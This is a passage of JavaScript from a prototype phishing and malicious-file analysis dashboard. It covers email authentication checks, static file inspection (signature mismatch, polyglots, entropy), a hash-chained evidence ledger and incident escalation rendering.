  const dkim=(auth.match(/dkim=(\w+)/i)||[])[1]||'none';
  const dmarc=(auth.match(/dmarc=(\w+)/i)||[])[1]||'none';
  feats.push({k:'SPF',v:spf,flag:spf!=='pass'});
  feats.push({k:'DKIM',v:dkim,flag:dkim!=='pass'});
  feats.push({k:'DMARC',v:dmarc,flag:dmarc!=='pass'});
  const failed=[['SPF',spf],['DKIM',dkim],['DMARC',dmarc]].filter(([,v])=>v!=='pass');
  if(failed.length) inds.push({...RISK.AUTH_FAIL,id:'AUTH_FAIL',
    ev:failed.map(([k,v])=>k+'='+v).join(', ')+' - sending domain '+(fromDom||'unknown')+' did not authorise this message'});

  if(rtDom && fromDom && rtDom!==fromDom) inds.push({...RISK.REPLYTO,id:'REPLYTO',
    ev:'Replies go to '+rtDom+', not '+fromDom});

  for(const b of BRANDS){
    const dl=display.toLowerCase();
    const dn=dl.replace(/[^a-z0-9]/g,'');
    if(b.kw.some(k=>dl.includes(k)||dn.includes(k)) && !b.kw.some(k=>fromDom.includes(k))){
      inds.push({...RISK.DISPLAY_SPOOF,id:'DISPLAY_SPOOF',
        ev:'Display name reads "'+display+'" but the message was sent from '+(fromDom||'an unknown domain')});
      break;
    }
  }
  if(returnPath && fromDom && dom(returnPath) && dom(returnPath)!==fromDom)
    inds.push({pts:15,tier:'heu',id:'ENVELOPE',label:'Envelope sender differs from header sender',
      ev:'Return-Path '+dom(returnPath)+' vs From '+fromDom});

  const urls=[...new Set((text.match(RE_URL)||[]))];
  const badUrls=urls.filter(x=>{ try{ const h=new URL(x).hostname.toLowerCase();
    return IOC_DB.some(i=>i.ind===h||i.ind===registrable(h)); }catch(e){ return false; } });
  if(badUrls.length) inds.push({pts:60,tier:'det',id:'IOC_MATCH',label:'Message contains a known malicious link',
    ev:badUrls[0]});

  const attach=[...new Set((text.match(/filename="?([^"\r\n;]+)"?/gi)||[]).map(s=>s.replace(/filename="?/i,'').replace(/"$/,'')))];
  for(const a of attach){
    const fn=analyseFilename(a);
    for(const f of fn.findings){ const r=RISK[f.id]; if(r) inds.push({...r,id:f.id,ev:'Attachment "'+a+'": '+f.ev}); }
  }

  const score=scoreOf(inds), b=band(score);
  return {kind:'email',target:subject,feats,inds,score,band:b,urls,attachments:attach,from,fromDom};
}

/* ==================================================================
   HASH-LINKED PROVENANCE LEDGER (real SHA-256 chaining)
   ================================================================== */
const Ledger={
  blocks:[],
  async init(){
    if(this.blocks.length) return;
    const g={index:0,ts:nowISO(),action:'LEDGER_GENESIS',evidenceId:'-',payloadHash:'0'.repeat(64),actor:'system',prev:'0'.repeat(64)};
    g.hash=await this.hashBlock(g); this.blocks=[g];
  },
  hashBlock(b){
    return sha256Text([b.index,b.ts,b.action,b.evidenceId,b.payloadHash,b.actor,b.prev].join('|'));
  },
  async commit(action,evidenceId,payloadHash,actor='R. Kannan'){
    await this.init();
    const prev=this.blocks[this.blocks.length-1];
    const b={index:prev.index+1,ts:nowISO(),action,evidenceId,payloadHash,actor,prev:prev.hash};
    b.hash=await this.hashBlock(b);
    this.blocks.push(b);
    return b;
  },
  async validate(){
    for(let i=1;i<this.blocks.length;i++){
      const b=this.blocks[i];
      if(b.prev!==this.blocks[i-1].hash) return {ok:false,at:i,why:'Previous-hash link broken'};
      if(await this.hashBlock(b)!==b.hash) return {ok:false,at:i,why:'Block hash does not match its contents'};
    }
    return {ok:true};
  },
  recordFor(evidenceId,action='EVIDENCE_REGISTERED'){
    return this.blocks.filter(b=>b.evidenceId===evidenceId&&b.action===action).pop();
  }
};

/* ==================================================================
   APPLICATION STATE
   ================================================================== */
const State={
  verdicts:[], evidence:[], incidents:[], responses:[], timeline:[],
  monitor:[], qlog:[], autoScan:false,
  seq:{ev:0,inc:0},
  evId(){ return 'EV-2026-'+pad(++this.seq.ev,4); },
  incId(){ return 'INC-2026-'+pad(++this.seq.inc,4); },
  addTimeline(t,d,meta,kind){ this.timeline.push({t,d,meta,kind}); },
};

;

"use strict";

/* ==================================================================
   FILE ANALYSIS ORCHESTRATION
   ================================================================== */
async function analyseFile(file){
  const buf = await file.arrayBuffer();
  const bytes = new Uint8Array(buf);
  const hash = await sha256(buf);
  const inds = [], notes = [];

  const det = detectType(bytes);
  const fn  = analyseFilename(file.name);
  const declaredMime = file.type || EXT_MIME[fn.ext] || '(none declared)';
  const text = new TextDecoder('utf-8',{fatal:false}).decode(bytes.slice(0,Math.min(bytes.length,300000)));

  /* --- Layer 1: identity cross-validation --- */
  const extMatchesSig = det.ext.includes(fn.ext);
  const IMAGE_EXT=['jpg','jpeg','png','gif','bmp','webp','svg','ico'];
  const claimsImage = IMAGE_EXT.includes(fn.ext);

  if(det.cat==='executable' && claimsImage){
    inds.push({...RISK.MAGIC_EXEC,id:'MAGIC_EXEC',
      ev:'Extension .'+fn.ext+' claims an image; bytes at offset 0 are '+det.type});
  } else if(!extMatchesSig && fn.ext && det.cat!=='unknown'){
    inds.push({...RISK.MIME_MISMATCH,id:'MIME_MISMATCH',
      ev:'Extension .'+fn.ext+' and declared type "'+declaredMime+'" do not match the detected '+det.type});
  }
  for(const f of fn.findings){ const r=RISK[f.id]; if(r) inds.push({...r,id:f.id,ev:f.ev}); }

  /* --- Layer 2: structural --- */
  let struct=null;
  if(det.type.startsWith('JPEG'))      struct=parseJPEG(bytes);
  else if(det.type.startsWith('PNG'))  struct=parsePNG(bytes);
  else if(det.type.startsWith('GIF'))  struct=parseGIF(bytes);
  else if(det.type.startsWith('SVG'))  struct=parseSVG(text);
  else if(det.type.startsWith('PDF'))  struct=parsePDF(text);
  else if(det.type.startsWith('ZIP'))  struct=parseZIP(bytes,text);

  if(struct) for(const f of struct.findings){
    let r=RISK[f.id];
    if(!r){
      if(f.id.startsWith('SVG_')) r=RISK.SVG_SCRIPT;
      else if(f.id.startsWith('PDF_')) r=RISK.ACTIVE_DOC;
      else if(f.id==='OOXML_VBA'||f.id==='OOXML_EXT') r=RISK.ACTIVE_DOC;
      else if(f.id==='ZIP_EXE') r=RISK.ZIP_EXE;
      else if(f.id==='ZIP_BOMB') r=RISK.ZIP_BOMB;
      else if(f.id==='ZIP_TRAV') r=RISK.STRUCT;
      else r=RISK.STRUCT;
    }
    inds.push({...r,id:f.id,label:f.label,ev:f.ev});
  }

  /* --- Layer 3: embedded / polyglot --- */
  const embedded = scanEmbedded(bytes, Math.max(det.sigLen,4));
  if(embedded.length){
    inds.push({...RISK.POLYGLOT,id:'POLYGLOT',
      ev:embedded.map(e=>e.name+' at offset '+e.off).join('; ')});
  }
  const strings = extractStrings(bytes);
  const joined  = strings.join('\n');
  const susHits=[];
  for(const [re,label] of SUS_STRINGS){ const m=joined.match(re); if(m) susHits.push({label,sample:m[0].slice(0,80)}); }
  if(susHits.length) inds.push({...RISK.SUS_STRING,id:'SUS_STRING',
    ev:susHits.map(h=>h.label).join('; ')});
  const urls=[...new Set((joined.match(RE_URL)||[]))].slice(0,12);
  const ips =[...new Set((joined.match(RE_IP)||[]).filter(x=>x.split('.').every(o=>+o<256)))].slice(0,8);
  const badIoc = [...urls,...ips].map(v=>{
    let key=v; try{ if(v.startsWith('http')) key=new URL(v).hostname; }catch(e){}
    return IOC_DB.find(i=>i.ind===key||i.ind===registrable(key));
  }).find(Boolean);
  if(badIoc) inds.push({pts:60,tier:'det',id:'IOC_MATCH',label:'Embedded indicator matches a known malicious record',
    ev:badIoc.ind+' - campaign '+badIoc.campaign});

  /* --- Layer 4: statistical --- */
  const eAll = entropy(bytes);
  const wins = entropyWindows(bytes);
  const hiWin = wins.filter(w=>w.e>7.5);
  if(det.cat==='image' && hiWin.length && eAll<7.9 && hiWin.length<wins.length*0.6){
    inds.push({...RISK.ENTROPY,id:'ENTROPY',
      ev:hiWin.length+' window(s) above 7.5 bits/byte inside a file averaging '+eAll.toFixed(2)});
  }
  let stego=null;
  if(det.cat==='image' && bytes.length>4096){
    let ones=0,tot=0;
    for(let i=bytes.length-3000;i<bytes.length;i++){ ones+=bytes[i]&1; tot++; }
    const ratio=ones/tot;
    stego={ratio,flag:Math.abs(ratio-0.5)<0.012};
    if(stego.flag){
      inds.push({...RISK.STEGO,id:'STEGO',
        ev:'Least-significant-bit distribution is '+(ratio*100).toFixed(1)+'% - near-perfect uniformity is atypical of natural image data'});
      notes.push('Data hidden by steganography is inert. It cannot execute on its own and requires a separate program to extract it. This is an indicator, not a verdict.');
    }
  }

  /* --- Layer 5: reputation --- */
  if(HASH_DB[hash]) inds.push({...RISK.KNOWN_HASH,id:'KNOWN_HASH',ev:'SHA-256 matches '+HASH_DB[hash]});

  const score=scoreOf(inds), b=band(score);
  return {
    kind:'file', name:file.name, size:file.size, hash, declaredMime, ext:fn.ext,
    detected:det, struct, embedded, strings:strings.slice(0,200), susHits, urls, ips,
    entropy:eAll, wins, stego, inds, score, band:b, notes, bytes:bytes.slice(0,64),
    lastModified:file.lastModified?new Date(file.lastModified).toISOString().replace('T',' ').slice(0,19)+'Z':'unavailable',
    _blob:file
  };
}

/* recommended action derives from the band, never invented */
function recommend(b){
  return {crit:'BLOCK AND QUARANTINE',high:'QUARANTINE',susp:'WARN USER - HOLD FOR REVIEW',safe:'ALLOW'}[b.key];
}

/* ==================================================================
   SHARED RENDERERS
   ================================================================== */
function renderIndicators(inds){
  if(!inds.length) return '<div class="empty"><div class="empty__t">No indicators fired</div><div class="empty__s">Every check completed without raising a signal.</div></div>';
  const order={det:0,heu:1,sta:2};
  const sorted=[...inds].sort((a,b)=> (order[a.tier]-order[b.tier]) || (b.pts-a.pts));
  return sorted.map(i=>`<div class="ind">
    <div class="ind__pts" style="color:${i.tier==='det'?'#C4453F':i.tier==='heu'?'var(--susp)':'var(--muted)'}">+${i.pts}</div>
    <div class="ind__body"><div class="ind__name">${esc(i.label)}</div><div class="ind__ev">${esc(i.ev)}</div></div>
    <div class="ind__tier"><span class="pill pill--${i.tier==='det'?'det':i.tier==='heu'?'heu':'sta'}">${TIER_NAME[i.tier]}</span></div>
  </div>`).join('');
}
function renderScoreCard(res){
  const b=res.band, cap=res.inds.reduce((a,i)=>a+i.pts,0);
  return `<div class="card">
    <div class="card__head"><div class="card__title">Risk assessment</div>
      <div class="card__hint"><span class="pill ${b.cls}"><span class="pill__dot"></span>${b.verdict}</span></div></div>
    <div class="card__body">
      <div class="riskbig">
        <div class="riskbig__n" style="color:${b.color}">${res.score}</div>
        <div class="riskbig__d">/ 100 &nbsp;·&nbsp; ${b.label}</div>
      </div>
      <div class="riskbar"><div class="riskbar__f" style="width:${res.score}%;background:${b.color}"></div></div>
      <div class="riskbar__ticks"><span>0 SAFE</span><span>25 SUSPICIOUS</span><span>50 HIGH</span><span>75 CRITICAL</span><span>100</span></div>
      <div class="eyebrow" style="margin-top:18px">Score composition, ${res.inds.length} indicator${res.inds.length===1?'':'s'}${cap>100?', capped from '+cap:''}</div>
      ${renderIndicators(res.inds)}
      <div class="note mt"><b>Recommended action: ${recommend(b)}</b> <span class="pill pill--sim">Simulated</span><br>
      <span class="small muted">No enforcement agent is connected in this prototype. The analysis and the decision are real; the enforcement is not.</span></div>
      ${res.notes&&res.notes.length?res.notes.map(n=>`<div class="note note--warn mt">${esc(n)}</div>`).join(''):''}
    </div></div>`;
}
function renderHexRibbon(res){
  const b=res.bytes, sigLen=res.detected.sigLen||0;
  const mism = res.inds.some(i=>i.id==='MAGIC_EXEC'||i.id==='MIME_MISMATCH');
  let cells='';
  for(let i=0;i<Math.min(16,b.length);i++){
    const cls = i<sigLen ? (mism?'is-sig':'is-sig-ok') : '';
    cells+=`<span class="hexb ${cls}">${b[i].toString(16).padStart(2,'0').toUpperCase()}</span>`;
  }
  let ascii='';
  for(let i=0;i<Math.min(16,b.length);i++){
    const c=b[i], ch=(c>=32&&c<=126)?String.fromCharCode(c):'.';
    ascii += i<sigLen ? '<b>'+esc(ch)+'</b>' : esc(ch);
  }
  return `<div class="card">
    <div class="card__head"><div class="card__title">Bytes on disk</div><div class="card__hint">First 16 bytes</div></div>
    <div class="card__body">
      <div class="hexr"><div class="hexr__row">
        <span class="hexr__off">00000000</span>
        <span class="hexr__bytes">${cells}</span>
        <span class="hexr__ascii">${ascii}</span>
      </div>
      <div class="hexr__legend">
        <span class="pill ${mism?'pill--crit':'pill--safe'}">${mism?'CONTRADICTS EXTENSION':'CONSISTENT'}</span>
        <span>The highlighted bytes are the file signature. They say <b class="mono">${esc(res.detected.type)}</b>.
        The name says <b class="mono">.${esc(res.ext||'-')}</b>.</span>
      </div></div>
    </div></div>`;
}
function hashStrip(hash,other){
  let row='';
  for(let i=0;i<hash.length;i+=2){
    const pair=hash.slice(i,i+2);
    let cls='';
    if(other) cls = other.slice(i,i+2)===pair ? 'is-same' : 'is-diff';
    row+=`<div class="hbyte ${cls}">${pair}</div>`;
  }
  return `<div class="hstrip__row">${row}</div>`;
}

/* ==================================================================
   FILE SCANNER PAGE
   ================================================================== */
const PIPELINE=[
  'Read bytes without executing',
  'Compute SHA-256 fingerprint',
  'Cross-validate extension, MIME and signature',
  'Walk container structure',
  'Scan for embedded and polyglot content',
  'Extract strings and indicators',
  'Measure entropy distribution',
  'Match against indicator dataset',
  'Compute risk score'
];
async function runScan(file){
  const card=$('#scanStepsCard'), box=$('#scanSteps');
  card.style.display='';
  box.innerHTML=PIPELINE.map((s,i)=>`<div class="step" id="st${i}"><div class="step__ico"></div><div class="step__t">${esc(s)}</div><div class="step__ms"></div></div>`).join('');
  const t0=performance.now();
  const p=analyseFile(file);
  for(let i=0;i<PIPELINE.length;i++){
    const el=$('#st'+i); el.classList.add('is-run');
    await sleep(60+Math.random()*70);
    el.classList.remove('is-run'); el.classList.add('is-done');
    el.querySelector('.step__ico').textContent='✓';
    el.querySelector('.step__ms').textContent=Math.round(performance.now()-t0)+' ms';
  }
  const res=await p;
  renderScanResult(res);
  logVerdict(res);
  if(res.band.key==='crit'||res.band.key==='high') await escalate(res);
  return res;
}
function renderScanResult(res){
  const d=res.detected, s=res.struct;
  let structHTML='';
  if(s&&s.format==='PNG'&&s.chunks) structHTML=`<div class="eyebrow" style="margin-top:14px">PNG chunks</div>
    <table class="tbl"><thead><tr><th>Chunk</th><th class="tbl__num">Offset</th><th class="tbl__num">Length</th><th>CRC</th></tr></thead><tbody>
    ${s.chunks.slice(0,10).map(c=>`<tr><td class="mono">${esc(c.name)}</td><td class="tbl__num">${c.off}</td><td class="tbl__num">${c.len}</td>
      <td><span class="pill ${c.crcOK?'pill--safe':'pill--crit'}">${c.crcOK?'VALID':'FAILED'}</span></td></tr>`).join('')}</tbody></table>`;
  if(s&&s.format==='JPEG'&&s.segments) structHTML=`<div class="eyebrow" style="margin-top:14px">JPEG segments</div>
    <table class="tbl"><thead><tr><th>Marker</th><th class="tbl__num">Offset</th><th class="tbl__num">Length</th></tr></thead><tbody>
    ${s.segments.slice(0,8).map(c=>`<tr><td class="mono">${esc(c.marker)}</td><td class="tbl__num">${c.off}</td><td class="tbl__num">${c.len}</td></tr>`).join('')}</tbody></table>`;
  if(s&&s.format==='ZIP'&&s.entries&&s.entries.length) structHTML=`<div class="eyebrow" style="margin-top:14px">Archive entries (${s.entries.length})</div>
    <table class="tbl"><thead><tr><th>Path</th><th class="tbl__num">Stored</th><th class="tbl__num">Original</th></tr></thead><tbody>
    ${s.entries.slice(0,10).map(c=>`<tr><td class="mono">${esc(c.name)}</td><td class="tbl__num">${fmtBytes(c.csize)}</td><td class="tbl__num">${fmtBytes(c.usize)}</td></tr>`).join('')}</tbody></table>`;

  const maxE=Math.max(...res.wins.map(w=>w.e),0);
  const entHTML = res.wins.length ? `<div style="display:flex;align-items:flex-end;gap:2px;height:54px;margin-top:8px">
      ${res.wins.slice(0,60).map(w=>`<div title="offset ${w.off} · ${w.e.toFixed(2)} bits" style="flex:1;min-width:3px;height:${(w.e/8*100).toFixed(0)}%;background:${w.e>7.5?'var(--high)':'var(--accent-dim)'};border-radius:1px"></div>`).join('')}
    </div><div class="xsmall faint mono" style="margin-top:6px">2 KB windows, peak ${maxE.toFixed(2)} bits/byte, threshold 7.50 shown in red</div>`
    : '<p class="small muted">File is too small for windowed analysis.</p>';

  $('#scanResult').innerHTML = `
  ${renderScoreCard(res)}
  <div class="grid g2 mt">
    <div class="card"><div class="card__head"><div class="card__title">File identity</div></div><div class="card__body">
      <div class="kv">
        <div class="kv__k">Name</div><div class="kv__v mono">${esc(res.name)}</div>
        <div class="kv__k">Size</div><div class="kv__v">${fmtBytes(res.size)} <span class="faint">(${res.size} bytes)</span></div>
        <div class="kv__k">Extension</div><div class="kv__v mono">.${esc(res.ext||'-')}</div>
        <div class="kv__k">Declared MIME</div><div class="kv__v mono">${esc(res.declaredMime)}</div>
        <div class="kv__k">Detected type</div><div class="kv__v mono" style="color:${res.inds.some(i=>i.id==='MAGIC_EXEC')?'#C4453F':'var(--text)'}">${esc(d.type)}</div>
        <div class="kv__k">Category</div><div class="kv__v">${esc(d.cat)}</div>
        <div class="kv__k">Modified</div><div class="kv__v mono">${esc(res.lastModified)}</div>
        <div class="kv__k">Entropy</div><div class="kv__v mono">${res.entropy.toFixed(3)} bits/byte</div>
      </div>
      <div class="hstrip" style="margin-top:14px"><div class="hstrip__lbl">SHA-256</div>${hashStrip(res.hash)}</div>
    </div></div>
    ${renderHexRibbon(res)}
  </div>
  <div class="grid g2 mt">
    <div class="card"><div class="card__head"><div class="card__title">Structure</div>
      <div class="card__hint">${esc(s?s.format:'no parser')}</div></div><div class="card__body">
      ${s?'':'<p class="small muted">No structural parser applies to this format. Identity and content checks still ran.</p>'}
      ${s&&s.trailing?`<div class="note note--crit"><b>${fmtBytes(s.trailing)}</b> found beyond the end-of-image marker. A conformant image has nothing after it.</div>`:''}
      ${s&&s.width?`<p class="small muted">Declared dimensions ${s.width} × ${s.height} px${s.hasEXIF?' · EXIF present':''}</p>`:''}
      ${structHTML||'<p class="small muted mt-s">No structural anomalies recorded.</p>'}
    </div></div>
    <div class="card"><div class="card__head"><div class="card__title">Content</div>
      <div class="card__hint">${res.strings.length} strings</div></div><div class="card__body">
      ${res.embedded.length?`<div class="eyebrow">Embedded signatures</div>${res.embedded.map(e=>`<div class="small mono" style="color:#E88C87">▸ ${esc(e.name)} at offset ${e.off}</div>`).join('')}<div style="height:12px"></div>`:''}
      ${res.susHits.length?`<div class="eyebrow">Suspicious strings</div>${res.susHits.map(h=>`<div class="small">▸ ${esc(h.label)}<div class="ind__ev">${esc(h.sample)}</div></div>`).join('')}<div style="height:12px"></div>`:''}
      ${res.urls.length?`<div class="eyebrow">URLs found</div>${res.urls.slice(0,5).map(u=>`<div class="small mono muted">${esc(u)}</div>`).join('')}<div style="height:12px"></div>`:''}
      ${res.ips.length?`<div class="eyebrow">IP addresses</div><div class="small mono muted">${res.ips.map(esc).join(', ')}</div><div style="height:12px"></div>`:''}
      ${(!res.embedded.length&&!res.susHits.length&&!res.urls.length&&!res.ips.length)?'<p class="small muted">No embedded signatures, suspicious strings, or network indicators recovered.</p>':''}
      <div class="eyebrow" style="margin-top:6px">Entropy profile</div>${entHTML}
      ${res.stego?`<div class="eyebrow" style="margin-top:14px">LSB distribution</div>
        <p class="small ${res.stego.flag?'':'muted'}">${(res.stego.ratio*100).toFixed(1)}% ones in the trailing sample${res.stego.flag?' - near-uniform, flagged as an indicator only':' - within the range expected of natural image data'}</p>`:''}
    </div></div>
  </div>`;
}

;

"use strict";

/* ==================================================================
   VERDICT LOG + INCIDENT ESCALATION
   ================================================================== */
function logVerdict(res){
  State.verdicts.unshift({
    time:hhmmss(new Date()),
    artifact:res.kind==='file'?res.name:(res.kind==='url'?res.target:res.target),
    type:res.kind==='file'?'File':(res.kind==='url'?'URL':'Email'),
    band:res.band, score:res.score,
    top:res.inds.length?[...res.inds].sort((a,b)=>b.pts-a.pts)[0].label:'No indicators',
    res
  });
  paintCommand();
}

async function escalate(res){
  const evid=State.evId();
  const acquired=nowISO();
  const ev={
    id:evid, name:res.kind==='file'?res.name:res.target,
    type:res.kind==='file'?(res.detected?res.detected.type:'file'):res.kind,
    size:res.kind==='file'?res.size:new TextEncoder().encode(res.target).length,
    hash:res.kind==='file'?res.hash:await sha256Text(res.target),
    acquired, custodian:'R. Kannan', source:'World Monitor gateway analysis',
    integrity:'verified', res, tampered:false, custody:[]
  };
  ev.custody.push({ts:acquired,actor:'R. Kannan',action:'EVIDENCE_ACQUIRED',note:'Artifact captured at the analysis gateway'});
  const blk=await Ledger.commit('EVIDENCE_REGISTERED',evid,ev.hash);
  ev.custody.push({ts:blk.ts,actor:'system',action:'PROVENANCE_COMMITTED',note:'Ledger block #'+blk.index+' · '+blk.hash.slice(0,16)+'…'});
  State.evidence.push(ev);

  const inc={
    id:State.incId(), severity:res.band.label, score:res.score,
    detected:acquired, asset:'WKSTN-CHN-0417', victim:'priya.n@dept.gov.in',
    evidence:[evid], status:'OPEN', investigator:'R. Kannan',
    title:res.kind==='file'?'Deceptive file delivered by email - '+res.name:'Phishing link reported - '+res.host,
    res
  };
  State.incidents.unshift(inc);

  const now=new Date();
  const step=(off,d,meta,kind)=>State.addTimeline(hhmmss(new Date(now.getTime()+off*1000)),d,meta,kind);
  step(0,'Artifact received at analysis gateway',res.kind==='file'?res.name:res.target,'acc');
  step(2,'SHA-256 fingerprint computed',ev.hash,'acc');
  step(4,'Static analysis completed',res.inds.length+' indicators raised','acc');
  step(5,res.band.label+' classification assigned','Risk score '+res.score+'/100',res.band.key==='crit'?'crit':'high');
  step(7,'Evidence registered',evid,'ok');
  step(9,'Provenance committed to ledger','Block #'+blk.index,'ok');
  step(11,'Incident created',inc.id,'crit');
  step(14,'Response recommendations generated',recommend(res.band),'acc');

  const acts=[
    {a:'Quarantine artifact',s:'Recommended',n:'Move the file out of the user-accessible path and revoke execute permission.'},
    {a:'Warn the recipient',s:'Recommended',n:'Notify priya.n@dept.gov.in with the specific reason, not a generic alert.'},
    {a:'Block sender domain at the gateway',s:'Recommended',n:'Apply to the envelope domain, not the display name.'},
    {a:'Preserve evidence',s:'Completed',n:'Registered as '+evid+' with ledger provenance.'},
    {a:'Isolate endpoint WKSTNN-CHN-0417',s:'Pending approval',n:'Requires analyst sign-off; disruptive to the user.'},
    {a:'Search estate for the same SHA-256',s:'Recommended',n:'Retrospective hunt across mail and endpoint logs.'},
  ];
  State.responses=acts;
  paintAll();
  toast((res.band.key==='crit'?'Critical':'High-risk')+' verdict - incident '+inc.id+' created','crit');
}

function toast(msg,kind){
  const t=document.createElement('div');
  t.className='toast'+(kind==='crit'?' toast--crit':kind==='ok'?' toast--ok':'');
  t.innerHTML=esc(msg);
  document.body.appendChild(t);
  setTimeout(()=>{t.style.opacity='0';t.style.transition='opacity .3s';setTimeout(()=>t.remove(),320);},3600);
}

/* ==================================================================
   COMMAND CENTER
   ================================================================== */
let _prevMetrics = {inc:0, blocked:0, links:0};
function setTrend(elId, curr, prev){
  const el = $('#'+elId);
  if(!el) return;
  const delta = curr - prev;
  el.classList.remove('up','down');
  if(delta===0){
    el.textContent = 'No change';
  } else {
    const up = delta > 0;
    el.classList.add(up?'up':'down');
    el.textContent = (up?'▲ ':'▼ ') + Math.abs(delta) + ' since last update';
  }
}

function renderRiskDonut(){
  const rows=[['crit','Critical','#C4453F'],['high','High risk','#D9534F'],['susp','Suspicious','#D6A029'],['safe','Safe / Low','#4CAF6A'],['unk','Unknown','#8A929C']];
  const counts={crit:0,high:0,susp:0,safe:0,unk:0};
  State.verdicts.forEach(v=>counts[v.band.key]++);
  const total=State.verdicts.length;
  const R=52, C=+(2*Math.PI*R).toFixed(2);
  let offset=0;
  const segs = total ? rows.filter(([k])=>counts[k]>0).map(([k,l,c])=>{
    const frac = counts[k]/total;
    const len = +(frac*C).toFixed(2);
    const seg = `<circle class="riskchart__ring" cx="65" cy="65" r="${R}" fill="none" stroke="${c}" stroke-width="15" stroke-dasharray="${len} ${(C-len).toFixed(2)}" stroke-dashoffset="${-offset}" stroke-linecap="butt"/>`;
    offset += len;
    return seg;
  }).join('') : `<circle cx="65" cy="65" r="${R}" fill="none" stroke="var(--line2)" stroke-width="15"/>`;
  const legend = rows.map(([k,l,c])=>{
    const n=counts[k], pct = total? Math.round(n/total*100):0;
    return `<div class="rlrow"><span class="rlrow__dot" style="background:${c}"></span><span class="rlrow__label">${l}</span><span class="rlrow__count">${n}</span><span class="rlrow__pct">${pct}%</span></div>`;
  }).join('');
  $('#riskDist').innerHTML = `<div class="riskchart">
    <div class="riskchart__wrap">
      <svg width="130" height="130" viewBox="0 0 130 130">${segs}</svg>
      <div class="riskchart__center"><b>${total}</b><span>analysed</span></div>
    </div>
    <div class="riskchart__legend">${legend}</div>
  </div>
  <p class="xsmall faint" style="margin-top:12px">${total} artifact${total===1?'':'s'} analysed this session · UNKNOWN reflects indicators not yet observed in the local dataset.</p>`;
}

function renderCoverage(){
  const cov=[['Deterministic',9,'#4C8DFF','Byte-level facts - identity mismatch, RTLO, script in SVG, polyglot signatures'],
             ['Heuristic',11,'#D6A029','Signals that raise suspicion - domain age, brand mismatch, auth failure, typosquats'],
             ['Statistical',2,'#8A929C','Indicators only - entropy, LSB uniformity. Never establishes a verdict alone']];
  const total=cov.reduce((a,c)=>a+c[1],0);
  $('#coverage').innerHTML=cov.map(([n,c,col,d])=>{
    const pct=Math.round(c/total*100);
    return `<div class="covrow">
      <div class="covrow__h">
        <span class="pill" style="background:${col}22;color:${col};border-color:${col}55">${n}</span>
        <span class="covrow__c">${c} checks · ${pct}% of coverage</span>
      </div>
      <div class="covtrack"><div class="covfill" style="width:${pct}%;background:${col}"></div></div>
      <p class="covrow__d">${d}</p>
    </div>`;
  }).join('');
}

const CHAIN_STAGES=[
  {id:'phish',label:'Phishing',ico:'<path d="M4 4h16v16H4z"/><path d="m4 7 8 5 8-5"/>'},
  {id:'link',label:'Link / File',ico:'<path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1"/><path d="M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/>'},
  {id:'compromise',label:'Compromise',ico:'<path d="M12 2 4 6v6c0 5 3.4 8.9 8 10 4.6-1.1 8-5 8-10V6z"/><path d="M12 8v5M12 16h.01"/>'},
  {id:'investigation',label:'Investigation',ico:'<circle cx="11" cy="11" r="7"/><path d="m20 20-3.6-3.6"/>'},
  {id:'verify',label:'Verify',ico:'<path d="M12 2 4 6v6c0 5 3.4 8.9 8 10 4.6-1.1 8-5 8-10V6z"/><path d="m9 12 2 2 4-4"/>'},
  {id:'report',label:'Report',ico:'<path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="M15 2v5h5M8 13h8M8 17h5"/>'},
];
function renderChainFlow(activeId){
  const el=$('#chainFlow'); if(!el) return;
  const activeIdx = activeId==null ? -1 : CHAIN_STAGES.findIndex(s=>s.id===activeId);
  el.innerHTML = CHAIN_STAGES.map((s,i)=>{
    const nodeState = activeIdx<0 ? '' : (i<activeIdx?'is-done':(i===activeIdx?'is-active':''));
    const arrowState = activeIdx<0 ? '' : (i<=activeIdx ? (i<activeIdx?'is-done':'is-active') : '');
    const arrow = i>0 ? `<div class="chainflow__arrow ${arrowState}"></div>` : '';
    return `${arrow}<div class="chainflow__node ${nodeState}">
      <div class="chainflow__ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">${s.ico}</svg></div>
      <div class="chainflow__label">${s.label}</div>
    </div>`;
  }).join('');
}

function paintCommand(){
  const incCount = State.incidents.length;
  const blockedCount = State.verdicts.filter(v=>v.band.key==='crit'||v.band.key==='high').length;
  const linksCount = State.verdicts.filter(v=>v.type!=='File'&&v.band.key!=='safe').length;

  $('#mIncidents').textContent = incCount;
  $('#mBlocked').textContent = blockedCount;
  $('#mLinks').textContent = linksCount;

  const critInc = State.incidents.filter(i=>i.severity==='CRITICAL').length;
  const sevEl = $('#mIncidentsSev');
  sevEl.textContent = critInc ? critInc+' critical' : 'None critical';
  sevEl.className = 'pill ' + (critInc ? 'pill--crit' : 'pill--safe');

  setTrend('mIncidentsTrend', incCount, _prevMetrics.inc);
  setTrend('mBlockedTrend', blockedCount, _prevMetrics.blocked);
  setTrend('mLinksTrend', linksCount, _prevMetrics.links);
  _prevMetrics = {inc:incCount, blocked:blockedCount, links:linksCount};

  const bad=State.evidence.filter(e=>e.integrity!=='verified').length;
  $('#mIntegrity').textContent=State.evidence.length?(bad?'FAIL':'PASS'):'-';
  $('#mIntegrity').closest('.metric').className='card metric '+(State.evidence.length?(bad?'metric--crit':'metric--safe'):'metric--safe');
  $('#mIntegrityFoot').textContent=State.evidence.length?(bad?bad+' of '+State.evidence.length+' items diverged':State.evidence.length+' item(s) match the ledger'):'No records';

  const tb=$('#tblVerdicts tbody');
  tb.innerHTML=State.verdicts.length?State.verdicts.slice(0,9).map(v=>`<tr title="${esc(v.top)}">
    <td class="mono xsmall faint">${v.time}</td>
    <td style="max-width:230px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" class="mono xsmall">${esc(v.artifact)}</td>
    <td class="xsmall">${v.type}</td>
    <td><span class="pill ${v.band.cls}">${v.band.verdict}</span></td>
    <td class="tbl__num">${v.score}</td>
    <td class="xsmall muted" style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(v.top)}</td></tr>`).join('')
    :`<tr><td colspan="6"><div class="empty"><div class="empty__t">Nothing analysed yet</div>
      <div class="empty__s">Run the guided demo, or submit a file in the scanner.</div></div></td></tr>`;

  renderRiskDonut();
  renderCoverage();
}

;

"use strict";

/* ==================================================================
   PHISHING PAGE
   ================================================================== */
function renderPhish(res){
